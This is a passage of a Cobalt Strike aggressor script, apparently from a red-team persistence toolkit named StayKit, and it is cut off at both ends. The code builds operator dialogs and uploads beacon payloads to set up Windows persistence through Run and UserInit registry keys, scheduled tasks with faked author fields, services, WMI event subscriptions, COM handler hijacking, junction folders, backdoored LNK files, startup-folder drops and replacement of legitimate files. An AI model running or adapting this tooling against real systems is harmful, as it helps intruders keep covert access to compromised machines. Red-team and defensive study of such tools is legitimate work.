			$finalpayload = &compilepl($noncompiled, $plarch);
		}
		else{
			$finalpayload = $noncompiled;
		}
		blog2($bid, "" . dstamp(ticks()) . " - StayKit is writing built template to $droplo")
		bupload_raw($bid, $droplo, $finalpayload);
	}	
}

sub persistencehandler{
	local('$bid $parg $ops $dloc $inst $persisttype');
	$bid = $1;
	$ops = $2;
	$parg = $3;
	$persisttype = $4;
	$inst = "Installing";

	if(($ops["template"] ne "") && ($ops["customfile"] ne "")){
		show_error("Cannot select a template and custom file, must pick one");
		exit();
	}
	if(($ops["template"] ne "") && ($ops["listener"] eq "")){
		show_error("Listener is required with template");
		exit();
	}

	if($ops['cleanup'] eq "true"){
		$inst = "Removing";
	}
	if($ops['cleanup'] eq "true"){
		&executepersistence($bid, $ops, $parg, $inst, $persisttype);
	}
	else if (($ops["template"] eq "") && ($ops["customfile"] eq "")){
		&executepersistence($bid, $ops, $parg, $inst, $persisttype);
	}
	else{
		$dloc = $ops["droplocation"];
		&payloadhandler($bid, $ops, $parg, $dloc);
		&executepersistence($bid, $ops, $parg, $inst, $persisttype);
	}
}

sub argbuilder{
	local('$bid $parg $pertype $path $x');
	$bid = $1;
	$parg = "";
	$pertype = $3;

	$parg .= 'action=';
	$parg .= $pertype;
	$parg .= ' ';
	
	#Ugly but gets the job done
	if(($2["regkeyname"]) && ($2["regkeyname"] ne "")){
		$parg .= 'keyname="';
		$parg .= $2["regkeyname"];
		$parg .= '" ';
	}
	if(($2["taskname"]) && ($2["taskname"] ne "")){
		$parg .= 'taskname="';
		$parg .= $2["taskname"];
		$parg .= '" ';
	}
	if(($2["servicename"]) && ($2["servicename"] ne "")){
		$parg .= 'servicename="';
		$parg .= $2["servicename"];
		$parg .= '" ';
	}
	if(($2["eventname"]) && ($2["eventname"] ne "")){
		$parg .= 'eventname="';
		$parg .= $2["eventname"];
		$parg .= '" ';
	}
	if (($2["attime"]) && ($2["attime"] ne "")){
		$parg .= 'attime="';
		$parg .= $2["attime"];
		$parg .= '" ';
	}
	if (($2["clsid"]) && ($2["clsid"] ne "")){
		$parg .= 'clsid="';
		$parg .= $2["clsid"];
		$parg .= '" ';
	}
	if (($2["dllpath"]) && ($2["dllpath"] ne "")){
		$parg .= 'dllpath="';
		$parg .= $2["dllpath"];
		$parg .= '" ';
	}
	if (($2["lnkpath"]) && ($2["lnkpath"] ne "")){
		$parg .= 'lnkpath="';
		$parg .= $2["lnkpath"];
		$parg .= '" ';
	}
	if (($2["command"]) && ($2["command"] ne "")){
		$parg .= 'command="';
		$parg .= $2["command"];
		$parg .= '" ';
	}
	if (($2["regkey"]) && ($2["regkey"] ne "")){
		($x, $path) = split(':', $2['regkey']);
		$parg .= 'keypath="';
		$parg .= $path;
		$parg .= '" ';
	}
	if(($2["runasuser"]) && ($2["runasuser"] ne "")){
		$parg .= 'runasuser="';
		$parg .= $2["runasuser"];
		$parg .= '" ';
	}
	if(($2["logonuser"]) && ($2["logonuser"] ne "")){
		$parg .= 'logonuser="';
		$parg .= $2["logonuser"];
		$parg .= '" ';
	}
	if(($2["triggertype"]) && ($2["triggertype"] ne "")){
		$parg .= 'triggertype="';
		$parg .= $2["triggertype"];
		$parg .= '" ';
	}
	if(($2["author"]) && ($2["author"] ne "")){
		$parg .= 'author="';
		$parg .= $2["author"];
		$parg .= '" ';
	}
	if(($2["description"]) && ($2["description"] ne "")){
		$parg .= 'description="';
		$parg .= $2["description"];
		$parg .= '" ';
	}
	if(($2["rep"]) && ($2["rep"] ne "")){
		$parg .= 'rep="';
		$parg .= $2["rep"];
		$parg .= '" ';
	}
	if(($2["guid"]) && ($2["guid"] ne "")){
		$parg .= 'guid="';
		$parg .= $2["guid"];
		$parg .= '" ';
	}
	if(($2["filepath"]) && ($2["filepath"] ne "")){
		$parg .= 'filepath="';
		$parg .= $2["filepath"];
		$parg .= '" ';
	}

	if(($2["folder"]) && ($2["folder"] ne "")){
		$parg .= 'folder="';
		$parg .= $2["folder"];
		$parg .= '" ';
	}
	if(($2["actionid"]) && ($2["actionid"] ne "")){
		$parg .= 'actionid="';
		$parg .= $2["actionid"];
		$parg .= '" ';
	}
	if(($2["lnkname"]) && ($2["lnkname"] ne "")){
		$parg .= 'lnkname="';
		$parg .= $2["lnkname"];
		$parg .= '" ';
	}
	if(($2["lnktarget"]) && ($2["lnktarget"] ne "")){
		$parg .= 'lnktarget="';
		$parg .= $2["lnktarget"];
		$parg .= '" ';
	}
	if(($2["lnkicon"]) && ($2["lnkicon"] ne "")){
		$parg .= 'lnkicon="';
		$parg .= $2["lnkicon"];
		$parg .= '" ';
	}
	if (($2["cleanup"]) && ($2["cleanup"] ne "false")){
		$parg .= 'cleanup=true ';
	}
	&persistencehandler($bid, $2, $parg, $pertype);
}

sub precheck{
	# pre checks
		# Add to prechecks 
	#if(){

	#}
	#else{
		#show_error("[-] You are missing required arguments for your persistence method");
		#exit();
	#}
}

sub replacefile{
	local('$bid $newname $app $handle $data');
	$bid = $1;
	if($2['cleanup'] eq "true"){
		if(($2['droplocation'] eq "") || ($2['customfile'] eq "")){
			berror($bid, "Drop location is the file being cleaned up and customfile is the original file");
			exit();
		}
		else{
			if($2["action"] eq "Download and remove"){
				$handle = openf($2["customfile"]);
				$data = readb($handle, -1);
				closef($handle);
				blog2($bid, "" . dstamp(ticks()) . " - StayKit is writing $2['customfile'] to $2['droplocation'] for cleanup")
				bupload_raw!($bid, $2['droplocation'], $data);
			}
			else if(($2["action"] eq "Append .bak to name") || ($2["action"] eq "Append random characters to name")){
				blog2($bid, "Deleting $2['droplocation'] and setting $2['customfile'] back original name");
				brm!($bid, $2["droplocation"]);
				bmv!($bid, $2["customfile"], $2["droplocation"]);
			}
		}
	}
	else{
		binput($bid, "StayKit replacefile Persistence");
		if($2["action"] eq "Download and remove"){
			bdownload($bid, $2["droplocation"]);
			bpause($bid, 5000);
			#Should be able to overwrite rather than delete
			#brm($bid, $2["droplocation"]);
			blog2($bid, "Overwrote original file at $2['droplocation']");
		}
		else if($2["action"] eq "Append .bak to name"){
			$newname = "" . $2["droplocation"] . "\.bak";
			bmv!($bid, $2["droplocation"], $newname);
			bpause($bid, 5000);
			blog2($bid, "Appended \.bak to $2['droplocation']");
		}
		else if($2["action"] eq "Append random characters to name"){
			$app = &randchars();
			$newname = "" . $2["droplocation"] . "\.$app";
			bmv!($bid, $2["droplocation"], $newname);
			bpause($bid, 5000);
			blog2($bid, "Appended \.$app to $2['droplocation']");
		}
		&payloadhandler($bid, $2, $null, $2["droplocation"]);
	}
}

sub randchars{
	local('$i $ra @chararray')
	@chararray = @("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z");
	$ra = ""; 
	for ($i = 0; $i < 7; $i++){ 
		$ra .= rand(@chararray)
	} 
	return $ra;
}

sub startupdir{
	local('$bid $ops $fname $dpath $dloc $user $name $x');
	$bid = $1;
	$ops = $2;
	if (($ops["template"] eq "") && ($ops["customfile"] eq "") && ($ops["cleanup"] eq "false")){
		show_error("Must select payload to drop");
		exit();
	}
	else if(($ops["template"] ne "") && ($ops["customfile"] ne "") &&($ops["cleanup"] eq "false")){
		show_error("Select either a template or a custom file");
		exit();
	}
	else{
		if($ops["startuppath"] eq "%APPDATA%"){
			$user = binfo($bid, 'user');
			if($user ismatch '\w+ \*'){
				($name, $x) = split(' \*', $user)
			}
			else{
				$name = $user;
			}
			$dpath = "C:\\Users\\$name\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
		}
		else if($ops["startuppath"] eq "%PROGRAMDATA%"){
			$dpath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp";
		}
		if($ops["filename"] eq ""){
			show_error("Must enter on target filename");
			exit();
		}
		else{
			$fname = $ops["filename"];
		}
		$dloc = "$dpath\\$fname";
		if($ops["cleanup"] eq "true"){
			brm($bid, $dloc);
		}
		else{
			&payloadhandler($bid, $ops, $null, $dloc);
		}
		

	}
}

#---------------------------------------------
# Elevated
#---------------------------------------------
sub elevatedregistrydialog{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "elevatedregistrykey";

	%defaults["regkeyname"]  = %persistdefaults["regkeyname"];
	%defaults["command"] = %persistdefaults["command"];
	%defaults["droplocation"] = %persistdefaults["droplocation"];
	%defaults["customfile"] = %persistdefaults["customfile"];
	%defaults["listener"] = %persistdefaults["listener"];
	%defaults["template"] = %persistdefaults["template"];
	
	$dialog = dialog("Elevated: Registry Key Persistence", %defaults, lambda({
		if($2 eq "Help"){
			&eleregistryhelp();
			break;
		}
		&argbuilder($bid, $3, $ptype);
		}, \$bid, \$3, \$ptype));
	dialog_description($dialog, "Elevated: Create new registry key");
	drow_text($dialog, "regkeyname", "Key Name: ");
	drow_text($dialog, "command", "Command: ");
	drow_text($dialog, "droplocation", "Drop Location: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template: ");
	drow_combobox($dialog, "regkey", "Registry Key", @("HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run", "HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
	dbutton_action($dialog, "Execute");
	dbutton_action($dialog, "Help");
	dialog_show($dialog);
}

sub elevateduserinitregistrydialog{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "elevateduserinitkey";

	%defaults["command"] = %persistdefaults["command"];
	%defaults["customfile"] = %persistdefaults["customfile"];
	%defaults["listener"] = %persistdefaults["listener"];
	%defaults["template"] = %persistdefaults["template"];
	%defaults["droplocation"] = %persistdefaults["droplocation"];

	$dialog = dialog("Elevated: Registry UserInit Key Persistence", %defaults, lambda({
		if($2 eq "Help"){
			&eleuserinitregistryhelp();
			break;
		}
		&argbuilder($bid, $3, $ptype);
		}, \$bid, \$3, \$ptype));
	dialog_description($dialog, "Elevated: Create new registry UserInit key");
	drow_text($dialog, "command", "Command: ");
	drow_text($dialog, "droplocation", "Drop Location: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template: ");
	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
	dbutton_action($dialog, "Execute");
	dbutton_action($dialog, "Help");
	dialog_show($dialog);
}

sub scheduledtaskdialog{
	local('$dialog %defaults $bid $runasuser');
	$bid = $1;
	$ptype = "scheduledtask";

	%defaults["taskname"]  = %persistdefaults["taskname"];
	%defaults["command"] = %persistdefaults["command"];
	%defaults["customfile"] = %persistdefaults["customfile"];
	%defaults["listener"] = %persistdefaults["listener"];
	%defaults["template"] = %persistdefaults["template"];
	%defaults["droplocation"] = %persistdefaults["droplocation"];

	$dialog = dialog("Elevated: Scheduled Task", %defaults, lambda({
		if($2 eq "Help"){
			&elescheduledtaskhelp();
			break;
		}
		&argbuilder($bid, $3, $ptype);
		}, \$bid, \$3, \$ptype));
	dialog_description($dialog, "Elevated: Create a new scheduled task");
	drow_text($dialog, "taskname", "Task Name: ");
	drow_text($dialog, "command", "Command: ");
	drow_text($dialog, "runasuser", "Run As: ");
	drow_text($dialog, "logonuser", "Logon As: ");
	drow_combobox($dialog, "triggertype", "Trigger Type", @("hourly", "daily", "weekly", "monthly", "idle", "logon", "boot"));
	# Add folder option
	drow_text($dialog, "author", "Author: ");
	drow_text($dialog, "description", "Description: ");
	drow_text($dialog, "rep", "Repetition: ");
	drow_text($dialog, "attime", "At Time: ");
	drow_text($dialog, "droplocation", "Drop Location: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template File: ");
	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
	dbutton_action($dialog, "Execute");
	dbutton_action($dialog, "Help");
	dialog_show($dialog);
}

sub servicedialog{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "createservice";

	%defaults["servicename"]  = %persistdefaults["servicename"];
	%defaults["command"] = %persistdefaults["command"];
	%defaults["customfile"] = %persistdefaults["customfile"];
	%defaults["listener"] = %persistdefaults["listener"];
	%defaults["template"] = %persistdefaults["template"];
	%defaults["droplocation"] = %persistdefaults["droplocation"];

	$dialog = dialog("Elevated: Service Persistence", %defaults, lambda({
		if($2 eq "Help"){
			&eleservicehelp();
			break;
		}
		&argbuilder($bid, $3, $ptype);
		}, \$bid, \$3, \$ptype));
	dialog_description($dialog, "Elevated: Create new service");
	drow_text($dialog, "servicename", "Service Name: ");
	drow_text($dialog, "command", "Command: ");
	#Add Service Description
	drow_text($dialog, "droplocation", "Drop Location: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template: ");
	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
	dbutton_action($dialog, "Execute");
	dbutton_action($dialog, "Help");
	dialog_show($dialog);
}

sub wmieventsubdialog{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "wmieventsub";

	%defaults["eventname"]  = %persistdefaults["eventname"];
	%defaults["command"] = %persistdefaults["command"];
	%defaults["attime"] = %persistdefaults["attime"];
	%defaults["customfile"] = %persistdefaults["customfile"];
	%defaults["listener"] = %persistdefaults["listener"];
	%defaults["template"] = %persistdefaults["template"];
	%defaults["droplocation"] = %persistdefaults["droplocation"];

	$dialog = dialog("Elevated: WMI Event Subscription Key Persistence", %defaults, lambda({
		if($2 eq "Help"){
			&elewmieventsubhelp();
			break;
		}
		&argbuilder($bid, $3, $ptype);
		}, \$bid, \$3, \$ptype));
	dialog_description($dialog, "Elevated: Create WMI Event Subscription");
	drow_text($dialog, "eventname", "Event Name: ");
	drow_text($dialog, "command", "Command: ");
	drow_text($dialog, "attime", "At Time: ");
	drow_text($dialog, "droplocation", "Drop Location: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template: ");
	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
	dbutton_action($dialog, "Execute");
	dbutton_action($dialog, "Help");
	dialog_show($dialog);
}


#---------------------------------------------
# Non-Elevated
#---------------------------------------------
sub userregistrydialog{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "userregistrykey";

	%defaults["regkeyname"]  = %persistdefaults["regkeyname"];
	%defaults["command"] = %persistdefaults["command"];
	%defaults["customfile"] = %persistdefaults["customfile"];
	%defaults["template"] = %persistdefaults["template"];
	%defaults["listener"] = %persistdefaults["listener"];
	%defaults["droplocation"] = %persistdefaults["droplocation"];

	$dialog = dialog("Non-Elevated: Registry Key Persistence", %defaults, lambda({
		if($2 eq "Help"){
			&nonregistryhelp();
			break;
		}
		&argbuilder($bid, $3, $ptype);
		}, \$bid, \$3, \$ptype));
	dialog_description($dialog, "Non-Elevated: Create a new registry key");
	drow_text($dialog, "regkeyname", "Key Name: ");
	drow_text($dialog, "command", "Command: ");
	drow_text($dialog, "droplocation", "Drop Location: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template: ");
	drow_combobox($dialog, "regkey", "Registry Key", @("HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run", "HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
	dbutton_action($dialog, "Execute");
	dbutton_action($dialog, "Help");
	dialog_show($dialog);
}

sub registryuserinitmprlogondialog{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "userinitmprlogonscriptkey";

	%defaults["command"] = %persistdefaults["command"];
	%defaults["customfile"] = %persistdefaults["customfile"];
	%defaults["template"] = %persistdefaults["template"];
	%defaults["listener"] = %persistdefaults["listener"];
	%defaults["droplocation"] = %persistdefaults["droplocation"];

	$dialog = dialog("Non-Elevated: Registry UserInitMprLogonScript Key Persistence", %defaults, lambda({
		if($2 eq "Help"){
			&nonregistryuserinitmprlogonhelp();
			break;
		}
		&argbuilder($bid, $3, $ptype);
		}, \$bid, \$3, \$ptype));
	dialog_description($dialog, "Non-Elevated: Create a new registry UserInitMprLogonScript key");
	drow_text($dialog, "command", "Command: ");
	drow_text($dialog, "droplocation", "Drop Location: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template: ");
	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
	dbutton_action($dialog, "Execute");
	dbutton_action($dialog, "Help");
	dialog_show($dialog);
}

sub schtskcomhijackdialog{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "schtaskcomhijack";

	%defaults["clsid"] = %persistdefaults["clsid"];
	%defaults["dllpath"] = %persistdefaults["dllpath"];
	%defaults["customfile"] = %persistdefaults["customfile"];
	%defaults["template"] = %persistdefaults["template"];
	%defaults["listener"] = %persistdefaults["listener"];
	%defaults["droplocation"] = %persistdefaults["droplocation"];


	$dialog = dialog("Non-Elevated: Scheduled Task COM Handler Hijack", %defaults, lambda({
		if($2 eq "Help"){
			&nonschtskcomhijackhelp();
			break;
		}
		&argbuilder($bid, $3, $ptype);
	}, \$bid, \$3, \$ptype));
	dialog_description($dialog, "Non-Elevated: Scheduled Task COM Hijack Persistence");
	drow_text($dialog, "clsid", "ClassID: ");
	drow_text($dialog, "dllpath", "DLL Path: ");
	drow_text($dialog, "droplocation", "Drop Location: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template: ");
	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
	dbutton_action($dialog, "Execute");
	dbutton_action($dialog, "Help");
	dialog_show($dialog);
}

sub junctionfolderdialog{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "junctionfolder";

	%defaults["dllpath"]  = %persistdefaults["dllpath"];
	%defaults["customfile"] = %persistdefaults["customfile"];
	%defaults["template"] = %persistdefaults["template"];
	%defaults["listener"] = %persistdefaults["listener"];
	%defaults["droplocation"] = %persistdefaults["droplocation"];

	$dialog = dialog("Non-Elevated: Junction Folder Persistence", %defaults, lambda({
		if($2 eq "Help"){
			&nonjunctionfolderhelp();
			break;
		}
		&argbuilder($bid, $3, $ptype);
		}, \$bid, \$3, \$ptype));
	dialog_description($dialog, "Non-Elevated: Create a new junction folder. Make sure DLL arch matches OS arch");
	drow_text($dialog, "dllpath", "Dll Path: ");
	drow_text($dialog, "guid", "GUID: ");
	drow_text($dialog, "droplocation", "Drop Location: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template: ");
	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
	dbutton_action($dialog, "Execute");
	dbutton_action($dialog, "Help");
	dialog_show($dialog);
}

#---------------------------------------------
# Misc
#---------------------------------------------
sub addactionschtaskdialog{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "scheduledtaskaction";

	%defaults["droplocation"]  = %persistdefaults["droplocation"];
	%defaults["action"] = "";
	%defaults["listener"] = %persistdefaults["listener"];
	%defaults["customfile"] = %persistdefaults["customfile"];
	%defaults["template"] = %persistdefaults["template"];
	%defaults["taskname"] = "";
	%defaults["command"] = "";
	%defaults["actionid"] = "";
	%defaults["folder"] = "";
	%defaults["cleanup"] = "false";

	$dialog = dialog("Misc: Add Scheduled Task Action", %defaults, lambda({
		if($2 eq "Help"){
			&miscaddschtaskactionhelp();
			break;
		}
		&argbuilder($bid, $3, $ptype);
		}, \$bid, \$3, \$ptype));
	dialog_description($dialog, "Misc: Add Action to Existing Scheduled Task");
	drow_text($dialog, "taskname", "TaskName: ");
	drow_text($dialog, "command", "Command: ");
	drow_text($dialog, "folder", "Task Folder: ");
	drow_text($dialog, "actionid", "Action ID: ");
	drow_text($dialog, "droplocation", "Drop Location: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template: ");
	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
	dbutton_action($dialog, "Execute");
	dbutton_action($dialog, "Help");
	dialog_show($dialog);
}

sub replacefiledialog{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "replacefile";

	%defaults["droplocation"]  = %persistdefaults["droplocation"];
	%defaults["action"] = "";
	%defaults["listener"] = %persistdefaults["listener"];
	%defaults["customfile"] = %persistdefaults["customfile"];
	%defaults["template"] = %persistdefaults["template"];
	%defaults["cleanup"] = "false";

	$dialog = dialog("Misc: Replace file", %defaults, lambda({
		if($2 eq "Help"){
			&miscreplacefilehelp();
			break;
		}
		&replacefile($bid, $3, $ptype);
		}, \$bid, \$3, \$ptype));
	dialog_description($dialog, "Misc: Replaces file on disk with selected file");
	drow_text($dialog, "droplocation", "File Path: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template: ");
	drow_combobox($dialog, "action", "Action: ", @("Download and remove", "Append .bak to name", "Append random characters to name"));
	drow_checkbox($dialog, "cleanup", "Cleanup: ", " Cleanup Persistence");
	dbutton_action($dialog, "Execute");
	dbutton_action($dialog, "Help");
	dialog_show($dialog);
}

sub startupfolderdialog{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "startupfolder";

	%defaults["filename"] = "";
	%defaults["startuppath"]  = "%APPDATA%";
	%defaults["template"] = %persistdefaults["template"];
	%defaults["customfile"] = %persistdefaults["customfile"];
	%defaults["listener"] = %persistdefaults["listener"];
	
	$dialog = dialog("Misc: Startup Folder", %defaults, lambda({
		if($2 eq "Help"){
			&miscstartupfolderhelp();
			break;
		}
		&startupdir($bid, $3, $ptype);
		}, \$bid, \$3, \$ptype));
	dialog_description($dialog, "Misc: Startup Folder either %PROGRAMDATA% for all users or %APPDATA% for current user");
	drow_text($dialog, "filename", "Filename: ");
	drow_combobox($dialog, "startuppath", "Startup Directory: ", @("%APPDATA%", "%PROGRAMDATA%"));
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template File: ");
	drow_checkbox($dialog, "cleanup", "Cleanup: ", "Cleanup Persistence");
	dbutton_action($dialog, "Execute");
	dbutton_action($dialog, "Help");
	dialog_show($dialog);
}

sub newlnkdialog{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "newlnk";

	%defaults["droplocation"] = %persistdefaults["droplocation"];
	%defaults["command"] = %persistdefaults["command"];
	%defaults["customfile"] = %persistdefaults["customfile"];
	%defaults["template"] = %persistdefaults["template"];
	%defaults["listener"] = %persistdefaults["listener"];
	
	$dialog = dialog("Misc: New LNK file", %defaults, lambda({
		if($2 eq "Help"){
			&miscnewlnkhelp();
			break;
		}
		&argbuilder($bid, $3, $ptype);
		}, \$bid, \$3, \$ptype));
	dialog_description($dialog, "Misc: New LNK file");
	drow_text($dialog, "filepath", "Lnk Path: ");
	drow_text($dialog, "lnkname", "Lnk Name: ");
	drow_text($dialog, "lnktarget", "Command: ");
	drow_text($dialog, "lnkicon", "Lnk Icon: ");
	drow_text($dialog, "droplocation", "Drop Location: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template File: ");
	drow_checkbox($dialog, "cleanup", "Cleanup: ", "Cleanup Persistence");
	dbutton_action($dialog, "Execute");
	dbutton_action($dialog, "Help");
	dialog_show($dialog);
}

sub backdoorlnkdialog{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "backdoorlnk";

	%defaults["lnkpath"]  = %persistdefaults["lnkpath"];
	%defaults["command"] = %persistdefaults["regcommand"];
	%defaults["template"] = %persistdefaults["template"];
	%defaults["customfile"] = %persistdefaults["customfile"];
	%defaults["listener"] = %persistdefaults["listener"];
	%defaults["droplocation"] = %persistdefaults["droplocation"];

	$dialog = dialog("Misc: Backdoor LNK file", %defaults, lambda({
		if($2 eq "Help"){
			&miscbackdoorlnkhelp();
			break;
		}
		&argbuilder($bid, $3, $ptype);
		}, \$bid, \$3, \$ptype));
	dialog_description($dialog, "Misc: Backdoor LNK file");
	drow_text($dialog, "lnkpath", "Lnk Path: ");
	drow_text($dialog, "command", "Command: ");
	drow_text($dialog, "droplocation", "Drop Location: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_file($dialog, "template", "Template File: ");
	drow_checkbox($dialog, "cleanup", "Cleanup: ", "Cleanup Persistence");
	dbutton_action($dialog, "Execute");
	dbutton_action($dialog, "Help");
	dialog_show($dialog);
}


#---------------------------------------------
# Help Menus
#---------------------------------------------
# Should move this in to separate file
# will do in the future

sub eleregistryhelp{
	show_message("
	Method:
	    Elevated: Registry Key

	Description:
	    Creates a new registry key at specified location

	Options:
	    Key Name: Value name
	    Command: Command to be ran when registry is used
	    Drop Location: Location where to write a payload to (Optional)
	    Listener: Listener to generate shellcode for (Optional)
	    Custom File: Pre-created file to use instead of template (Optional)
	    Template: Template to use with generated shellcode instead of custom file (Optional)
	    Registry Key: Location where registry key will be created
	    Cleanup: Removes created key

	Cleanup Requirements:
	    Cleanup requires the key name and registry key (location)");
}

sub eleuserinitregistryhelp{
	show_message("
	Method:
	    Elevated: UserInit Registry Key

	Description:
	    Updates the user init registry key to also run a binary

	Options:
	    Command: Binary to be ran when registry is used
	    Drop Location: Location where to write a payload to (Optional)
	    Listener: Listener to generate shellcode for (Optional)
	    Custom File: Pre-created file to use instead of template (Optional)
	    Template: Template to use with generated shellcode instead of custom file (Optional)
	    Registry Key: Location where registry key will be created
	    Cleanup: Set key back to default value

	Cleanup Requirements:
	    No requirements");
}

sub elescheduledtaskhelp{
	show_message("
	Method:
	    Elevated: Scheduled Task

	Description:
	    Creates a new scheduled task

	Options:
	    Task Name: Scheduled task name
	    Command: Command to be ran when task triggers
	    Run As: User to run task as
	    Logon As: If trigger type if logon, specifies the logon of what user (Optional)
	    Trigger Type: The type of scheduled task
	    Author: Fake author of task (Optional)
	    Description: Fake description of task (Optional)
	    Repetition: If hourly trigger type, how many hours between trigger (Optional)
	    At Time: What time for stard boundary/when to trigger (Optional)
	    Drop Location: Location where to write a payload to (Optional)
	    Listener: Listener to generate shellcode for (Optional)
	    Custom File: Pre-created file to use instead of template (Optional)
	    Template: Template to use with generated shellcode instead of custom file (Optional)
	    Cleanup: Removes scheduled task

	Cleanup Requirements:
	    Cleanup requires the task name");
}

sub eleservicehelp{
	show_message("
	Method:
	    Elevated: Service

	Description:
	    Creates a new service

	Options:
	    Service Name: Service name
	    Command: Command to be ran when service is started
	    Drop Location: Location where to write a payload to (Optional)
	    Listener: Listener to generate shellcode for (Optional)
	    Custom File: Pre-created file to use instead of template (Optional)
	    Template: Template to use with generated shellcode instead of custom file (Optional)
	    Cleanup: Removes created service

	Cleanup Requirements:
	    Cleanup requires the service name");
}

sub elewmieventsubhelp{
	show_message("
	Method:
	    Elevated: WMI Event Subscription

	Description:
	    Creates a new WMI Event Subscription

	Options:
	    Event Name: Event subscription name
	    Command: Command to be ran when service is started
	    At Time: Either 'startup' or a time to trigger (ex: '10:30')
	    Drop Location: Location where to write a payload to (Optional)
	    Listener: Listener to generate shellcode for (Optional)
	    Custom File: Pre-created file to use instead of template (Optional)
	    Template: Template to use with generated shellcode instead of custom file (Optional)
	    Cleanup: Removes created service

	Cleanup Requirements:
	    Cleanup requires the event subscription name");
}

sub nonregistryhelp{
	show_message("
	Method:
	    Non-Elevated: Registry Key

	Description:
	    Creates a new registry key at specified location

	Options:
	    Key Name: Value name
	    Command: Command to be ran when registry is used
	    Drop Location: Location where to write a payload to (Optional)
	    Listener: Listener to generate shellcode for (Optional)
	    Custom File: Pre-created file to use instead of template (Optional)
	    Template: Template to use with generated shellcode instead of custom file (Optional)
	    Registry Key: Location where registry key will be created
	    Cleanup: Removes created key

	Cleanup Requirements:
	    Cleanup requires the key name and registry key (location)");
}

sub nonregistryuserinitmprlogonhelp{
	show_message("
	Method:
	    Non-Elevated: UserInitmMprLogonScript Registry Key

	Description:
	    Updates UserInitmMprLogonScript Registry Key

	Options:
	    Command: Command to be ran when key is used
	    Drop Location: Location where to write a payload to (Optional)
	    Listener: Listener to generate shellcode for (Optional)
	    Custom File: Pre-created file to use instead of template (Optional)
	    Template: Template to use with generated shellcode instead of custom file (Optional)
	    Cleanup: Removes registry key

	Cleanup Requirements:
	    No requirements");
}

sub nonschtskcomhijackhelp{
	show_message("
	Method:
	    Non-Elevated: Scheduled Task COM Handler Hijack

	Description:
	    Creates a registry key at HKCU\\Software\\Classes\\CLSID\\<CLSID>\\InprocServer32 that points to a DLL

	Options:
	    ClassID: The CLSID that corresponds to the task's COM Handler CLSID to be hijacked
	    DLL Path: The path to set the registry value to of DLL to be loaded
	    Drop Location: Location where to write a payload to (Optional)
	    Listener: Listener to generate shellcode for (Optional)
	    Custom File: Pre-created file to use instead of template (Optional)
	    Template: Template to use with generated shellcode instead of custom file (Optional)
	    Cleanup: Removes created registry key

	Cleanup Requirements:
	    Cleanup requires the CLSID");

		drow_text($dialog, "clsid", "ClassID: ");
